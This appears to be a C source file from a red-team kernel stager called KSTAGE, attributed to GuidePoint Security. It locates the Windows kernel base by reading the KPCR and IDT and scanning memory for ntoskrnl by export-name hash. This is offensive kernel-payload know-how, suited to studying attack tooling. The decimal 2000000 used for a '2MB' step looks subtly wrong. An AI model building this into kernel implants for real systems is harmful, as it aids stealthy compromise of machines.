/*!
 *
 * KSTAGE
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

typedef union _KIDTENTRY64
{
	union
	{
		struct
		{
			USHORT OffsetLow;
			USHORT Selector;

			struct
			{
				USHORT IstIndex		: 3;
				USHORT Reserved0	: 5;
				USHORT Type		: 5;
				USHORT Dpl		: 2;
				USHORT Present		: 1;
			};
				
			USHORT 	OffsetMiddle;
			ULONG 	OffsetHigh;
			ULONG	Reserved1;
		};

		ULONGLONG Alignment;
	};
} KIDTENTRY64, *PKIDTENTRY64;

/*!
 *
 * Purpose:
 *
 * Finds the NT base via Kernel Process Control
 * Routine.
 *
!*/
D_SEC( B ) PVOID PcrGetNtBase( VOID )
{
	ULONG_PTR		Low = 0;
	ULONG_PTR		Mid = 0;
	ULONG_PTR		Hig = 0;

	PKPCR			Pcr = NULL;
	PIMAGE_DOS_HEADER	Dos = NULL;
	PIMAGE_NT_HEADERS	Nth = NULL;
	PIMAGE_DATA_DIRECTORY	Dir = NULL;
	PIMAGE_EXPORT_DIRECTORY	Exp = NULL;

	/* Get KPCR address from GS */
	Pcr = C_PTR( __readgsqword( FIELD_OFFSET( KPCR, Self ) ) );
	Low = Pcr->IdtBase->OffsetLow;
	Mid = Pcr->IdtBase->OffsetMiddle;
	Hig = Pcr->IdtBase->OffsetHigh;

	/* Convert offsets to a pointer */
	Hig = Hig << 32;
	Mid = Mid << 16;
	Dos = C_PTR( U_PTR( Hig + Mid + Low ) );
	Dos = C_PTR( U_PTR( U_PTR( Dos ) &~ ( 2000000 - 1 ) ) );

	/* Search for DOS header from the address */
	do {
		/* Is matching the DOS signature? */
		if ( Dos->e_magic == IMAGE_DOS_SIGNATURE ) {
			if ( Dos->e_lfanew < 0x300 ) {
				Nth = C_PTR( U_PTR( Dos ) + Dos->e_lfanew );
				/* Is matching the NT Signature? */
				if ( Nth->Signature == IMAGE_NT_SIGNATURE ) {
					Dir = & Nth->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];
					if ( Dir->VirtualAddress ) {
						Exp = C_PTR( U_PTR( Dos ) + Dir->VirtualAddress );

						/* Has the ntoskrnl export name? */
						if ( HashString( C_PTR( U_PTR( Dos ) + Exp->Name ), 0 ) == 0xa3ad0390 ) {
							/* Return */ break;
						};
					};
				};
			};
		};
		/* Decrement by 2MB */
		Dos = C_PTR( U_PTR( Dos ) - 2000000 );
	} while ( TRUE );

	/* Return Address */
	return C_PTR( Dos );
};
